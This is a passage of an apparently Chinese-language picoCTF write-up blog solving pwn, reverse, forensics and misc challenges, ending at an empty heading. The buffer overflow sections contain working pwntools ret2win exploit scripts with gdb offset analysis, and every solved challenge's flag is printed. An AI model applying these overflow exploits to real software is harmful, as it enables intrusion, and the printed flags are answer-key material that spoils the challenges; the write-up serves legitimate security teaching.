最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為 `ord(A) == 65`），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是 `input[16]`跟 `num`中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704141242017.png)

```txt
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

## buffer overflow 0

這題也是給了可執行文件和源代碼，先下載下來看看。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig)
{
  printf("%s\n", flag);  // 這裡會print出flag
  fflush(stdout);
  exit(1);
}

void vuln(char *input)
{
  char buf2[16];  // 這裡是關鍵。函數的名稱vuln代表著vulnerability
  strcpy(buf2, input);
}

int main(int argc, char **argv)
{

  FILE *f = fopen("flag.txt", "r");
  if (f == NULL)
  {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
           "own debugging flag.\n");
    exit(0);
  }

  fgets(flag, FLAGSIZE_MAX, f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler 當運行時出現Signal: SIGSEGV (Segmentation fault)時會調用sigsegv_handler函數

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

**分析代碼**

1. Winning condition 是要觸發 Segmentation fault。
2. `vuln`函式裡面的 `buf2`宣告為 16 個字元的大小，也就是 16 個 Bytes。
3. 當 `gets`輸入的內容超過 16 個 Bytes 的時候，觸發錯誤。

這邊我們可以再來看一下除了 `gets`以外的危險函式，也就是 `strcpy`。（[Buffer Overflow example - strcpy](https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy)）

man 手冊裡面也寫了，程式設計師要負起責任，指派一個足夠大的空間給 strcpy 的 dst（Destination）。

![Manual page for strcpy](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702145932067.png)

**BOF 攻擊**

所以我們知道，在這裡只要輸入很長的字串，就會造成 `strcpy`出錯，並得到 flag，那就來試試看吧！

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702150413588.png)

```txt
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## buffer overflow 1

老樣子，一個 ELF 檔案，一個源碼。先看一下代碼。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win()
{
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL)
  {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
           "own debugging flag.\n");
    exit(0);
  }

  fgets(buf, FLAGSIZE, f);
  printf(buf);
}

void vuln()
{
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

看起來是個 ret2win 的題目，那就直接開始吧。先用 gdb 找一下 offset。

```bash
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
Starting program: /home/kali/picoCTF/vuln.1
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────
*EAX  0x41
*EBX  0x6161616a ('jaaa')
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049350 (__libc_csu_init) ◂— endbr32
*EBP  0x6161616b ('kaaa')
*ESP  0xffffcfb0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
*EIP  0x6161616c ('laaa')
───────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────
Invalid address 0x6161616c










────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffcfb0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│     0xffffcfb4 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│     0xffffcfb8 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│     0xffffcfbc ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│     0xffffcfc0 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│     0xffffcfc4 ◂— 'raaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│     0xffffcfc8 ◂— 'saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│     0xffffcfcc ◂— 'taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
──────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────
 ► 0 0x6161616c
   1 0x6161616d
   2 0x6161616e
   3 0x6161616f
   4 0x61616170
   5 0x61616171
   6 0x61616172
   7 0x61616173
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l laaa
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

找到他的 offset 為 44 後再看一下 `win()`的地址。

```bash
pwndbg> disass win
Dump of assembler code for function win:
   0x080491f6 <+0>:     endbr32
   0x080491fa <+4>:     push   ebp
   0x080491fb <+5>:     mov    ebp,esp
   0x080491fd <+7>:     push   ebx
   0x080491fe <+8>:     sub    esp,0x54
   0x08049201 <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049206 <+16>:    add    ebx,0x2dfa
   0x0804920c <+22>:    sub    esp,0x8
   0x0804920f <+25>:    lea    eax,[ebx-0x1ff8]
   0x08049215 <+31>:    push   eax
   0x08049216 <+32>:    lea    eax,[ebx-0x1ff6]
   0x0804921c <+38>:    push   eax
   0x0804921d <+39>:    call   0x80490c0 <fopen@plt>
   0x08049222 <+44>:    add    esp,0x10
   0x08049225 <+47>:    mov    DWORD PTR [ebp-0xc],eax
   0x08049228 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x0804922c <+54>:    jne    0x8049258 <win+98>
   0x0804922e <+56>:    sub    esp,0x4
   0x08049231 <+59>:    lea    eax,[ebx-0x1fed]
   0x08049237 <+65>:    push   eax
   0x08049238 <+66>:    lea    eax,[ebx-0x1fd8]
   0x0804923e <+72>:    push   eax
   0x0804923f <+73>:    lea    eax,[ebx-0x1fa3]
   0x08049245 <+79>:    push   eax
   0x08049246 <+80>:    call   0x8049040 <printf@plt>
   0x0804924b <+85>:    add    esp,0x10
   0x0804924e <+88>:    sub    esp,0xc
   0x08049251 <+91>:    push   0x0
   0x08049253 <+93>:    call   0x8049090 <exit@plt>
   0x08049258 <+98>:    sub    esp,0x4
   0x0804925b <+101>:   push   DWORD PTR [ebp-0xc]
   0x0804925e <+104>:   push   0x40
   0x08049260 <+106>:   lea    eax,[ebp-0x4c]
   0x08049263 <+109>:   push   eax
   0x08049264 <+110>:   call   0x8049060 <fgets@plt>
   0x08049269 <+115>:   add    esp,0x10
   0x0804926c <+118>:   sub    esp,0xc
   0x0804926f <+121>:   lea    eax,[ebp-0x4c]
   0x08049272 <+124>:   push   eax
   0x08049273 <+125>:   call   0x8049040 <printf@plt>
   0x08049278 <+130>:   add    esp,0x10
   0x0804927b <+133>:   nop
   0x0804927c <+134>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x0804927f <+137>:   leave
   0x08049280 <+138>:   ret
End of assembler dump.
```

找到了它的地址是 `0x080491f6`。那就開始構造 Exploit 吧。

```python
from pwn import *

r = remote("saturn.picoctf.net", 64447)

payload = b""
offset = 44
win_addr = 0x080491F6

payload += b"A" * offset
payload += p32(win_addr)
r.sendline(payload)
r.interactive()
```

```txt
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

## buffer overflow 2

和前兩題一樣，先看看代碼。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2)
{
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL)
  {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
           "own debugging flag.\n");
    exit(0);
  }

  fgets(buf, FLAGSIZE, f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln()
{
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

這次和前面那題差不多，也是個 ret2win，但是它多了一個檢查條件，要判斷 arg1 和 arg2 的值是否為 0xCAFEF00D 和 0xF00DF00D，所以在構造 ROP Chain 的時候要記得把這兩個的值串接上去。接下來就開始編寫 Exploit 吧。

```python
from pwn import *

r = remote("saturn.picoctf.net", 56229)

payload = b""
offset = 112
win_addr = 0x08049296
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D

# p32(win_addr) is the return address for vuln() function
# p32(0) is the return address for win() function to make the program execute normally
payload += b"A" * offset + p32(win_addr) + p32(0) + p32(arg1) + p32(arg2)
r.sendline(payload)
r.interactive()
```

至於為甚麼中間要多加一個 p32(0)，我直接寫在註解中了。

```txt
picoCTF{argum3nt5_4_d4yZ_3c04eab0}
```

## two-sum

先看題目的代碼。

```c
#include <stdio.h>
#include <stdlib.h>

static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}

int main() {
    int num1, num2, sum;
    FILE *flag;
    char c;

    printf("n1 > n1 + n2 OR n2 > n1 + n2 \n");
    fflush(stdout);
    printf("What two positive numbers can make this possible: \n");
    fflush(stdout);

    if (scanf("%d", &num1) && scanf("%d", &num2)) {
        printf("You entered %d and %d\n", num1, num2);
        fflush(stdout);
        sum = num1 + num2;
        if (addIntOvf(sum, num1, num2) == 0) {
            printf("No overflow\n");
            fflush(stdout);
            exit(0);
        } else if (addIntOvf(sum, num1, num2) == -1) {
            printf("You have an integer overflow\n");
            fflush(stdout);
        }

        if (num1 > 0 || num2 > 0) {
            flag = fopen("flag.txt","r");
            if(flag == NULL){
                printf("flag not found: please run this on the server\n");
                fflush(stdout);
                exit(0);
            }
            char buf[60];
            fgets(buf, 59, flag);
            printf("YOUR FLAG IS: %s\n", buf);
            fflush(stdout);
            exit(0);
        }
    }
    return 0;
}
```

簡單來說就是要輸入兩個數字讓他相加後會 overflow。我們知道一個 Integer 的上限是$2^{31}-1$，也就是 2147483647，所以讓這個數字再加上 1 就會 overflow，利用這個原理，我們直接用 Netcat 連接到題目，輸入 2147483647 和 1，獲得 Flag。

```txt
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1}
```

## format string 0

先連接到題目，然後看一下題目長怎樣。

```bash
┌──(kali㉿kali)-[~]
└─$ nc mimas.picoctf.net 57925

Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation:
```

我在測試題目漏洞的時候輸入了一堆j，結果就直接得到flag了XD。

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/9/image_c66965b327bfcda4b0d23b31fca87bfe.png)

```txt
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## heap 0

先把題目給的source code下載下來看看。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	int rval = scanf("%d", &choice);
	if (rval == EOF){
	    exit(0);
	}
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
	    exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

發現他就是要想辦法去蓋掉一個叫做`safe_var`的變數，所以我們先連接到題目看看吧。

```txt
Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5d57314662b0  ->   pico
+-------------+----------------+
[*]   0x5d57314662d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 
```

連接到題目後，我們可以看見`input_data`和`safe_var`中間隔了0x20個bytes（0x5d57314662d0 - 0x5d57314662b0），也就是十進位中的32。這代表我們要寫入33個bytes到`input_data`裡面，因為很簡單，就也不寫Exploit了直接手動輸入吧。

首先輸入2，然後輸入33個字元。然後輸入完後再輸入1把Heap打印出來看看，就可以看到原本bico的地方被覆蓋掉了。覆蓋掉後再選4把Flag打印出來就好啦！

```txt
picoCTF{my_first_heap_overflow_1ad0e1a6}
```

# Reverse

## GDB Test Drive

這題的話先用 `wget` 把題目這個二進制檔案抓下來。

![Wget](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701212911463.png)

然後後面的步驟基本上就照著題目給的指令一步一步來就可以了。

![Instructions](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213346170.png)

這邊來稍微解釋一下每個指令的意義，他到底是做了哪些事情呢？

- `chmod +x gdbme`
  - 修改 gdbme 檔案的權限，新增執行權限（x）
- `gdb gdbme`
  - 使用 gdb（GNU Debugger）打開 gdbme 這個可執行檔案。
- `layout asm`
  - 啟用組合語言（Assembly, ASM）視圖
- `break *(main+99)`
  - 在 main 函數開始偏移 99 的位元組的地方設置斷點（Breakpoint）。
- `jump *(main+104)`
  - 跳到 main 函數開始偏移 104 位元組的地方繼續執行。

至於這邊為甚麼要在 main+99 的地方設定斷點，是因為這裡他調用了一個函式叫做 `sleep`，所以當我們直接執行 gdbme 的時候會進入到**sleep**的狀態，讓我們以為這個程式沒有做任何事。

![Sleep function](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/H1IxfrlvA.png)

所以在這邊我們才要把斷點設在 main+99，讓他執行到這邊的時候暫停一下，然後我們直接使用 jump 叫到下面一個地方，也就是 main+104 繼續執行。

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213211218.png)

這樣就得到 flag 啦。

```txt
picoCTF{d3bugg3r_dr1v3_72bd8355}
```

## Transformation

這題給了一個文字檔案叫做enc，以及一段Python程式碼告訴你他的加密邏輯。如下。

```python
''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
```

然後enc長這樣。

```txt
灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽
```

看起來像亂碼，不過那是因為Python把它兩個字元的ASCII合併成16個Bytes，再轉回字元，所以看起來亂糟糟。那解碼就是要把16個Bytes分別拆回去兩個8個Bytes的字元。

```python
def decode(encoded_string):
    decoded_flag = []
    for char in encoded_string:
        # 取得 Unicode 字符的 16 位整數值
        value = ord(char)
        # 提取高 8 位和低 8 位
        high_byte = value >> 8       # 取高 8 位
        low_byte = value & 0xFF      # 取低 8 位
        # 將其轉換回原來的兩個字符
        decoded_flag.append(chr(high_byte))
        decoded_flag.append(chr(low_byte))
    return ''.join(decoded_flag)

# 測試範例
encoded_string = "灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽"
decoded_flag = decode(encoded_string)
print(decoded_flag)
```

這樣就出來啦！

```txt
picoCTF{16_bits_inst34d_of_8_e703b486}
```

## vault-door-training

這題就是把Java檔下載下來就解出來了。他的原始碼如下。

```java
import java.util.*;

class VaultDoorTraining {
    public static void main(String args[]) {
        VaultDoorTraining vaultDoor = new VaultDoorTraining();
        Scanner scanner = new Scanner(System.in); 
        System.out.print("Enter vault password: ");
        String userInput = scanner.next();
	String input = userInput.substring("picoCTF{".length(),userInput.length()-1);
	if (vaultDoor.checkPassword(input)) {
	    System.out.println("Access granted.");
	} else {
	    System.out.println("Access denied!");
	}
   }

    // The password is below. Is it safe to put the password in the source code?
    // What if somebody stole our source code? Then they would know what our
    // password is. Hmm... I will think of some ways to improve the security
    // on the other doors.
    //
    // -Minion #9567
    public boolean checkPassword(String password) {
        return password.equals("w4rm1ng_Up_w1tH_jAv4_3808d338b46");
    }
}
```

在倒數第三行那個東西就是Flag了，自己把它加上Flag的格式就可以。這題主要是在提醒說不要把密碼等重要資訊放在原始碼裡面。

```txt
picoCTF{w4rm1ng_Up_w1tH_jAv4_3808d338b46}
```

# Forensics

## MSB

看這個題目名稱，然後又出現在 Forensics，應該是跟隱寫術有關了。如果你還不知道 LSB 和 MSB 都是個啥，可以先去看看 [Cryptography Notes 密碼學任督二脈](https://blog.cx330.tw/Notebooks/Cryptography-Notebook-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/)，裡面有解釋了甚麼是 LSB 和 MSB。

題目的題幹說，This image passes LSB statistical analysis。那相反的，它其實就是在暗示 flag 可能藏在 RGB 像素值的 MSB 中，所以就來提取它每個像素中的的 MSB 吧。這邊用到了 Python 中的 Pillow 這個庫，如果覺得太麻煩，也可以直接用這個現成的工具 [Stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve)。

Exploit 如下：

```python
from PIL import Image
import re


def extract_msb(image_path):
    image = Image.open(image_path)
    pixels = image.load()

    # 獲取圖片尺寸
    width, height = image.size

    # 初始化儲存提取自MSB的字串
    msb_data = ""

    # 提取每個像素的MSB
    for y in range(height):
        for x in range(width):
            r, g, b = pixels[x, y]
            # AND運算只保留了r, g, b的最高位，後面清零，再右移7位
            msb_data += str((r & 0b10000000) >> 7)
            msb_data += str((g & 0b10000000) >> 7)
            msb_data += str((b & 0b10000000) >> 7)

    # 將提取的MSB每8個位元轉換成字元
    hidden_text = ""
    for i in range(0, len(msb_data), 8):
        byte = msb_data[i : i + 8]
        if len(byte) == 8:
            hidden_text += chr(int(byte, 2))

    return hidden_text


def find_pico_ctf(data):
    pattern = r"picoCTF\{.*?\}"
    matches = re.findall(pattern, data)

    if matches:
        for match in matches:
            print(f"Found: {match}")
    else:
        print("No matches found")


if __name__ == "__main__":
    image_path = (
        "MSB/Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png"  # 替換為你的路徑
    )
    hidden_message = extract_msb(image_path)
    find_pico_ctf(hidden_message)
```

```txt
picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c}
```

## Verify

先連接到題目給的主機。

![Connect to the host](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/24/8/image_1446d103ab2481cd2a91af64ed316881.png)

之後用 `ls`看一下有甚麼文件。

```bash
ctf-player@pico-chall$ ls
checksum.txt  decrypt.sh  files
```

其中題目有說 `decrypt.sh`是用來解密檔案的腳本，`checksum.txt`是紀錄了正確的 hash 值得文件，最後files是一個目錄，裡面有很多文件，但只有一個是可以用來被解密的正確腳本。所以我們要做的就是去比對每個文件的哈希值和 `checksum.txt`的值。我們利用下面這兩個命令，先 `cat`出正確的雜湊值，再去用 `sha256sum`去計算每個 `files`裡面的檔案的雜湊，最後比對。

```bash
ctf-player@pico-chall$ cat checksum.txt 
5848768e56185707f76c1d74f34f4e03fb0573ecc1ca7b11238007226654bcda
ctf-player@pico-chall$ sha256sum files/* | grep 5848768e56185707f76c1d74f34f4e03fb0573ecc1ca7b11238007226654bcda
5848768e56185707f76c1d74f34f4e03fb0573ecc1ca7b11238007226654bcda  files/8eee7195
```

最後一行顯示正確的文件是 `8eee7195`，那就用 `./decrypt.sh`解密他。就得到Flag啦。

```txt
picoCTF{trust_but_verify_8eee7195}
```

## CanYouSee

這題的Handout解壓縮之後是一張圖片，我一開始嘗試了steghide去提取隱寫資訊，但是提取出來後的東西是下面這個。

```txt
The flag is not here maybe think in simpler terms. Data that explains data.
```

Data that explains data. 這就告訴我們要找他的Metadata啦。這邊使用下面這個命令。

```bash
exiftool ukn_reality.jpg 
```

執行後的結果為：

```bash
ExifTool Version Number         : 12.76
File Name                       : ukn_reality.jpg
Directory                       : .
File Size                       : 2.3 MB
File Modification Date/Time     : 2024:03:11 20:05:53-04:00
File Access Date/Time           : 2024:09:01 13:25:54-04:00
File Inode Change Date/Time     : 2024:09:01 13:25:46-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
XMP Toolkit                     : Image::ExifTool 11.88
Attribution URL                 : cGljb0NURntNRTc0RDQ3QV9ISUREM05fYjMyMDQwYjh9Cg==
Image Width                     : 4308
Image Height                    : 2875
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 4308x2875
Megapixels                      : 12.4
```

Attribution URL看起來很可疑，拿去base64解碼一下。

```bash
base64 -d <<< cGljb0NURntNRTc0RDQ3QV9ISUREM05fYjMyMDQwYjh9Cg==
```

果然，得到Flag啦。

```txt
picoCTF{ME74D47A_HIDD3N_b32040b8}
```

## Secret of the Polyglot

這題給了個PDF檔案，打開後發現了一半的Flag。

![一半的 Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240902021611952.png)

```txt
1n_pn9_&_pdf_1f991f77}
```

之後用`file flag2of2-final.pdf`這個命令檢查一下這個檔案。發現他其實是一個PNG檔案。所以我們用`mv flag2of2-final.pdf flag2of2-final.png`把檔名改掉後打開這張圖片。

![另一半的 Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240902021848978.png)

```txt
picoCTF{f1u3n7_
```

最後把兩個組合起來就好了。

```txt
picoCTF{f1u3n7_1n_pn9_&_pdf_1f991f77}
```

## Scan Surprise

先用SSH連接到題目。

```bash
ssh -p 51523 ctf-player@atlas.picoctf.net
```

然後發現他給了一張QR Code的圖片叫做Flag.png。但因為我手邊沒有手機，用`zbarimg`把其中的資訊提取出來。

```bash
zbarimg flag.png
```

他輸出的東西像這樣：

```bash
Connection Error (Failed to connect to socket /var/run/dbus/system_bus_socket: No such file or directory)
Connection Null
QR-Code:picoCTF{p33k_@_b00_b5ce2572}
scanned 1 barcode symbols from 1 images in 0 seconds
```

果然Flag就出來了！

```txt
picoCTF{p33k_@_b00_b5ce2572}
```

# Misc (General Skills)

## binhexa

這題比較簡單，就是一些基礎的 Binary operations 和最後把 bin 轉為 hexadecimal 就行了，它主要有六題的邏輯運算和一題 bin to hexadecimal。我是直接使用 picoCTF 提供的 Webshell 進行 nc 連接，然後用[這個線上工具](https://www.rapidtables.com/calc/math/binary-calculator.html)運算。題目如下。

```txt
Binary Number 1: 00101010
Binary Number 2: 00101011

Question 1/6:
Operation 1: '&'
Perform the operation on Binary Number 1&2.
Enter the binary result: 00101010
Correct!

Question 2/6:
Operation 2: '*'
Perform the operation on Binary Number 1&2.
Enter the binary result: 11100001110
Correct!

Question 3/6:
Operation 3: '<<'
Perform a left shift of Binary Number 1 by 1 bits.
Enter the binary result: 1010100
Correct!

Question 4/6:
Operation 4: '+'
Perform the operation on Binary Number 1&2.
Enter the binary result: 1010101
Correct!

Question 5/6:
Operation 5: '|'
Perform the operation on Binary Number 1&2.
Enter the binary result: 00101011
Correct!

Question 6/6:
Operation 6: '>>'
Perform a right shift of Binary Number 2 by 1 bits.
Enter the binary result: 10101
Correct!

Enter the results of the last operation in hexadecimal: 15

Correct answer!
The flag is: picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_d6f8047e}
```

這樣就得到 flag 啦！Easy peasy。

## endianness

這題 nc 到題目後會教你輸入某個字串的小端序和大端序，如下。這邊題目要求是 Hex 形式，並且字元中間不要有空格。

![題目](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240819171802197.png)

這邊我用 [CyberChef](https://gchq.github.io/CyberChef/) 就可以把這個字串轉為 Hex，轉換完後就是大端序的形式了，最後只要手動轉換為小端序，並且發送給 server 就可以了。

```txt
picoCTF{3ndi4n_sw4p_su33ess_02999450}
```

## Binary Search

這題好像沒有甚麼好講的，就是Binary Search。其實就有點像是小時候玩的終極密碼啦笑死，就這樣。

```txt
picoCTF{g00d_gu355_3af33d18}
```

## Blame Game

